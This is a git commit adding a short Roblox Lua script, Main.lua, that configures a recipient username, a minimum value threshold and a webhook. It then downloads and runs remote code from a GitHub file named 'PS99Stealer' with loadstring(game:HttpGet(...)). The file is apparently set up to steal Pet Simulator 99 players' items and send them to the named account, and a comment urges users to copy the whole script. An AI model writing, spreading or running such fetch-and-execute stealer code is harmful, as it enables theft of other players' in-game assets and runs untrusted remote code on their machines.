62d2eab1a5bfb783d61c89f7c632a4075d858c6d
Salesman <samyberri7@gmail.com>
2025-02-28 22:31:28 +0100

    Create Main.lua

---
+++ Main.lua
@@ -0,0 +1,6 @@
+Username = "Samyb79"
+Username2 = "Samyb79"
+MinimumRAP = 1
+Webhook = "."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))() -- copy the whole thing, even the username =
